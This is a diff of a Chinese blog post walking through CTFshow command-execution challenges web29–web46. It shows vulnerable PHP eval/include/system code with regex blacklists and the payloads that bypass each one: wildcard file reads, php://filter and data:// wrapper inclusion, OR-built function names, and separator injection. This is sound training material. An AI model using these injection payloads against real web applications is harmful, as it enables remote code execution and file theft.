@@ -1,7 +1,7 @@
-<!-- build time:Fri Jul 14 2023 17:04:01 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="rce"><link rel="canonical" href="https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><title>CTFshow-web入门命令执行 - CTFshow | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTFshow-web入门命令执行</h1><div class="meta"><span class="item" title="创建时间：2022-11-01 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-11-01T00:00:00+08:00">2022-11-01</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>28k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>25 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/66.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/115.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/3.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/4.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/112.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/96.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTFshow/" itemprop="item" rel="index" title="分类于 CTFshow"><span itemprop="name">CTFshow</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre><code class="php">&lt;?php
+<!-- build time:Fri Jul 14 2023 17:04:20 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="rce"><link rel="canonical" href="https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><title>CTFshow-web入门命令执行 - CTFshow | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTFshow-web入门命令执行</h1><div class="meta"><span class="item" title="创建时间：2022-11-01 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-11-01T00:00:00+08:00">2022-11-01</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>27k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>24 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/55.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/139.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/141.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/115.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/122.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/26.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTFshow/" itemprop="item" rel="index" title="分类于 CTFshow"><span itemprop="name">CTFshow</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="web29"><a class="anchor" href="#web29">#</a> web29</h2><pre><code class="language-php">&lt;?php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
     if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
         eval($c);
     &#125;
@@ -9,18 +9,18 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><pre><code class="url">?c=system(&#39;cat f?ag.php&#39;);
+</code></pre><pre><code class="language-url">?c=system('cat f?ag.php');
 ?c=echo `cat fla?.ph?`;
-c=passthru(&#39;cat fla?.ph?&#39;);
-?c=echo shell_exec(&#39;cat f*&#39;);
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026153914690.png" alt="image-20221026153914690"></p><p>就过滤了一个flag，问号匹配一下绕过</p><pre><code>system()
+c=passthru('cat fla?.ph?');
+?c=echo shell_exec('cat f*');
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026153914690.png" alt="image-20221026153914690"></p><p>就过滤了一个 flag，问号匹配一下绕过</p><pre><code>system()
 passthru()
 exec()//没有回显，返回最后一行
 shell_exec()//没有返回结果
-</code></pre><p>上面的函数都可以执行命令</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre><code class="php"> &lt;?php
+</code></pre><p>上面的函数都可以执行命令</p><h2 id="web30"><a class="anchor" href="#web30">#</a> web30</h2><pre><code class="language-php"> &lt;?php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
     if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;
         eval($c);
     &#125;
@@ -28,21 +28,21 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125; 
-</code></pre><p>黑名单加入了php和system，同上可绕过</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre><code class="php">&lt;?php
+</code></pre><p>黑名单加入了 php 和 system，同上可绕过</p><h2 id="web31"><a class="anchor" href="#web31">#</a> web31</h2><pre><code class="language-php">&lt;?php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
-    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c))&#123;
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'/i&quot;, $c))&#123;
         eval($c);
     &#125;
     
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>黑名单新加入cat，sort，shell，.，’</p><pre><code>?c=echo%09`tac%09fl*`;
+</code></pre><p>黑名单新加入 cat，sort，shell，.，'</p><pre><code>?c=echo%09`tac%09fl*`;
 ?c=passthru(&quot;tac%09f*&quot;);
-</code></pre><p>这里也简单的解释一下ctfshow给的payload</p><pre><code class="php">show_source(next(array_reverse(scandir(pos(localeconv())))));
-</code></pre><pre><code class="php">localeconv() 函数返回一包含本地数字及货币格式信息的数组。数组的第一项是’.‘
+</code></pre><p>这里也简单的解释一下 ctfshow 给的 payload</p><pre><code class="language-php">show_source(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre><pre><code class="language-php">localeconv() 函数返回一包含本地数字及货币格式信息的数组。数组的第一项是’.‘
 localeconv() 函数会返回以下数组元素：
 [decimal_point] - 小数点字符
 [thousands_sep] - 千位分隔符
@@ -72,9 +72,9 @@ localeconv() 函数会返回以下数组元素：
 4 - 直接在货币符号之后加上 - 号
 [grouping] - 显示数字组合形式的数组（例如：3 指示 1 000 000）
 [mon_grouping] - 显示货币数字组合形式的数组（例如：2 指示 1 00 00 00）
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113321559.png" alt="image-20221027113321559"></p><pre><code class="php">pos(),current():返回数组第一个值//配合上面的localeconv()可以返回一个点
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027114014169.png" alt="image-20221027114014169"></p><pre><code class="php">scandir() 函数返回指定目录中的文件和目录的数组。
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113840633.png" alt="image-20221027113840633"></p><pre><code class="php">end():数组指针指向最后一位
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113321559.png" alt="image-20221027113321559"></p><pre><code class="language-php">pos(),current():返回数组第一个值//配合上面的localeconv()可以返回一个点
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027114014169.png" alt="image-20221027114014169"></p><pre><code class="language-php">scandir() 函数返回指定目录中的文件和目录的数组。
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113840633.png" alt="image-20221027113840633"></p><pre><code class="language-php">end():数组指针指向最后一位
 next(): 数组指针指向下一位
 array_reverse(): 将数组颠倒
 array_rand(): 随机返回数组的键名
@@ -84,11 +84,11 @@ file_get_content()
 readfile()
 highlight_file()
 show_source()
-</code></pre><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre><code class="php">&lt;?php
+</code></pre><h2 id="web32"><a class="anchor" href="#web32">#</a> web32</h2><pre><code class="language-php">&lt;?php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
-    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c))&#123;
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i&quot;, $c))&#123;
         eval($c);
     &#125;
     
@@ -96,11 +96,11 @@ if(isset($_GET[&#39;c&#39;]))&#123;
     highlight_file(__FILE__);
 &#125;
 </code></pre><p>过滤限制加入了反引号、echo、;、(</p><pre><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre><p>过滤了括号，include函数不需要括号</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre><code class="php">&lt;?php
+</code></pre><p>过滤了括号，include 函数不需要括号</p><h2 id="web37"><a class="anchor" href="#web37">#</a> web37</h2><pre><code class="language-php">&lt;?php
 //flag in flag.php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
     if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
         include($c);
         echo $flag;
@@ -110,7 +110,7 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>这已经知道flag在flag.php中了，利用伪协议读取flag</p><pre><code>1、php://input 可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行
+</code></pre><p>这已经知道 flag 在 flag.php 中了，利用伪协议读取 flag</p><pre><code>1、php://input 可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行
 可以获取POST的数据流
 2、php://filter
 php://filter 协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码
@@ -121,12 +121,12 @@ data://协议通过执行资源类型,使后面的内容当做文件内容来执
 同样类似于php://input
 </code></pre><pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
 
-data://text/plain,&lt;?php system(&#39;cat fl?g.php&#39;);
-</code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre><code class="php"> &lt;?php
+data://text/plain,&lt;?php system('cat fl?g.php');
+</code></pre><h2 id="web38"><a class="anchor" href="#web38">#</a> web38</h2><pre><code class="language-php"> &lt;?php
 //flag in flag.php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
     if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;
         include($c);
         echo $flag;
@@ -136,12 +136,12 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125; 
-</code></pre><p>增加了php和file，还是使用data伪协议</p><pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
-</code></pre><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre><code class="php">&lt;?php
+</code></pre><p>增加了 php 和 file，还是使用 data 伪协议</p><pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+</code></pre><h2 id="web39"><a class="anchor" href="#web39">#</a> web39</h2><pre><code class="language-php">&lt;?php
 //flag in flag.php
 error_reporting(0);
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
     if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
         include($c.&quot;.php&quot;);
     &#125;
@@ -149,49 +149,49 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>有限制的文件包含，但是将php代码闭合即可</p><pre><code>?c=data://text/plain,&lt;?php system(&#39;tac fla?.php&#39;);?&gt;
-</code></pre><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre><code class="php">&lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c = $_GET[&#39;c&#39;];
-    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;
+</code></pre><p>有限制的文件包含，但是将 php 代码闭合即可</p><pre><code>?c=data://text/plain,&lt;?php system('tac fla?.php');?&gt;
+</code></pre><h2 id="web40"><a class="anchor" href="#web40">#</a> web40</h2><pre><code class="language-php">&lt;?php
+if(isset($_GET['c']))&#123;
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;
         eval($c);
     &#125;
         
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125; 
-</code></pre><p>有限制的代码执行，我还在像这全都过滤了怎么解决，后来发现这个括号过滤的是中文的，那么就可以构造和web31一样的payload</p><pre><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));
-</code></pre><p>也可以使用sessionID来构造命令执行</p><pre><code>session——start();system(session_id());
+</code></pre><p>有限制的代码执行，我还在像这全都过滤了怎么解决，后来发现这个括号过滤的是中文的，那么就可以构造和 web31 一样的 payload</p><pre><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre><p>也可以使用 sessionID 来构造命令执行</p><pre><code>session——start();system(session_id());
 ID=ls//这里打开flag我没有测试成功，应该是php版本的问题，
-</code></pre><p>这里打开flag我没有测试成功，应该是php版本的问题，这里有报错显示字符只能是数字字母加下划线</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221029190103627.png" alt="image-20221029190103627"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><pre><code class="php">&lt;?php
-if(isset($_POST[&#39;c&#39;]))&#123;
-    $c = $_POST[&#39;c&#39;];
-if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;, $c))&#123;
+</code></pre><p>这里打开 flag 我没有测试成功，应该是 php 版本的问题，这里有报错显示字符只能是数字字母加下划线</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221029190103627.png" alt="image-20221029190103627"></p><h2 id="web41"><a class="anchor" href="#web41">#</a> web41</h2><pre><code class="language-php">&lt;?php
+if(isset($_POST['c']))&#123;
+    $c = $_POST['c'];
+if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i', $c))&#123;
         eval(&quot;echo($c);&quot;);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
 ?&gt;
-</code></pre><p>过滤了很多字符，但是没有过滤|，一般看到这种特别全的过滤都是过滤无参rce,使用或运算</p><pre><code class="php">&lt;?php
+</code></pre><p>过滤了很多字符，但是没有过滤 |，一般看到这种特别全的过滤都是过滤无参 rce, 使用或运算</p><pre><code class="language-php">&lt;?php
 for($i=0;$i&lt;256;$i++)&#123;
     for ($j=0;$j&lt;256;$j++)&#123;
         if ($i&lt;16)&#123;
-            $hex_i=&#39;0&#39;.dechex($i);
+            $hex_i='0'.dechex($i);
         &#125;else&#123;
             $hex_i=dechex($i);
         &#125;
         if ($j&lt;16)&#123;
-            $hex_j=&#39;0&#39;.dechex($j);
+            $hex_j='0'.dechex($j);
         &#125;else&#123;
             $hex_j=dechex($j);
         &#125;
-        $preg=&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;;//题目的正则
+        $preg='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i';//题目的正则
         if (preg_match($preg,hex2bin($hex_i))||preg_match($preg,hex2bin($hex_j)))&#123;
             echo &quot;&quot;;
         &#125;else&#123;
-            $a=&#39;%&#39;.$hex_i;
-            $b=&#39;%&#39;.$hex_j;
+            $a='%'.$hex_i;
+            $b='%'.$hex_j;
             $c=(urldecode($a)|urldecode($b));
             if(ord($c)&gt;=32&amp;&amp;ord($c)&lt;=126)&#123;
                 echo $c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
@@ -201,34 +201,34 @@ for($i=0;$i&lt;256;$i++)&#123;
 &#125;
 </code></pre><pre><code>c=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%60%60&quot;|&quot;%0c%13&quot;)
 c=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%60%60%60%00%60%60%60%60%00%60%60%60&quot;|&quot;%03%01%14%20%06%0c%01%07%2e%10%08%10&quot;)
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134154287.png" alt="image-20221030134154287"></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre><code class="php">&lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134154287.png" alt="image-20221030134154287"></p><h2 id="web42"><a class="anchor" href="#web42">#</a> web42</h2><pre><code class="language-php">&lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>命令执行拼接了一个重定向，将后面的部分绕过即可</p><p>用%0a或者;、&amp;、|都可以绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134733941.png" alt="image-20221030134733941"></p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><pre><code class="php">&lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p>命令执行拼接了一个重定向，将后面的部分绕过即可</p><p>用 %0a 或者；、&amp;、| 都可以绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134733941.png" alt="image-20221030134733941"></p><h2 id="web43"><a class="anchor" href="#web43">#</a> web43</h2><pre><code class="language-php">&lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;
         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>增加了分号和cat的限制，打开文件的命令除去cat还有很多，上题提到的分隔符选一个没过滤的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135146874.png" alt="image-20221030135146874"></p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><pre><code class="php">&lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p>增加了分号和 cat 的限制，打开文件的命令除去 cat 还有很多，上题提到的分隔符选一个没过滤的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135146874.png" alt="image-20221030135146874"></p><h2 id="web44"><a class="anchor" href="#web44">#</a> web44</h2><pre><code class="language-php">&lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;
         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
     &#125;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;
-</code></pre><p>多了一个正则flag，匹配符绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135449426.png" alt="image-20221030135449426"></p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><pre><code class="php"> &lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p>多了一个正则 flag，匹配符绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135449426.png" alt="image-20221030135449426"></p><h2 id="web45"><a class="anchor" href="#web45">#</a> web45</h2><pre><code class="language-php"> &lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;
         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
     &#125;
@@ -236,51 +236,52 @@ if(isset($_GET[&#39;c&#39;]))&#123;
     highlight_file(__FILE__);
 &#125; 
 </code></pre><p>增加了空格替换空格的方式很多</p><pre><code>?c=sort%09fl*||
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135834529.png" alt="image-20221030135834529"></p><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><pre><code class="php"> &lt;?php
-if(isset($_GET[&#39;c&#39;]))&#123;
-    $c=$_GET[&#39;c&#39;];
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135834529.png" alt="image-20221030135834529"></p><h2 id="web46"><a class="anchor" href="#web46">#</a> web46</h2><pre><code class="language-php"> &lt;?php
+if(isset($_GET['c']))&#123;
+    $c=$_GET['c'];
     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;
         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
     &#125;
